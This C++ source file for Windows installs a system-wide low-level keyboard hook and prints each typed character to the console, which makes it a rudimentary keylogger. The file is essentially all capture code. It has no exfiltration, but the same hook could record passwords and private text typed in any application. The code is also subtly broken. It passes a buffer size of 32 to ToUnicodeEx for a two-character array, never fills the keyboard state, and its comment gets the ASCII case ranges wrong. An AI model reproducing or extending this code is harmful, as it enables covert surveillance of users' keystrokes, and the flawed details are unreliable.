#include <iostream>
#include <windows.h>
//#include <unistd.h>

using namespace std;
//Minuscule = 65 --> 90 ; Maj = 97 --> 122
// Lshift pressed ? asci_code + 30 : ascii_code
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static WCHAR key[2] = L"";
    static BYTE kbdState[256] {0};
    KBDLLHOOKSTRUCT kbdStruct = *(PKBDLLHOOKSTRUCT) lParam;
    switch (wParam) {
        case WM_KEYDOWN:
            switch (kbdStruct.vkCode) {
                case VK_RETURN:
                    break;
                case VK_LSHIFT:
                    break;
                case VK_RSHIFT:
                    break;
                case VK_DELETE:
                    break;
                case VK_LEFT:
                    break;
                case VK_RIGHT:
                    break;
                case VK_DOWN:
                    break;
                case VK_UP:
                    break;
                case VK_CONTROL:
                    break;
                case VK_SPACE:
                    break;
                case VK_BACK:
                    break;
                default :
                    ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, kbdState,key,32,0,nullptr);
                    cout << (char)*key;
                    break;
            }
        case WM_KEYUP:
            break;
    }
    return CallNextHookEx(nullptr,nCode,wParam,lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr,0);
    BOOL bRet;
    MSG msg;
    while ((bRet = GetMessage(&msg, nullptr,0,0))!= 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}



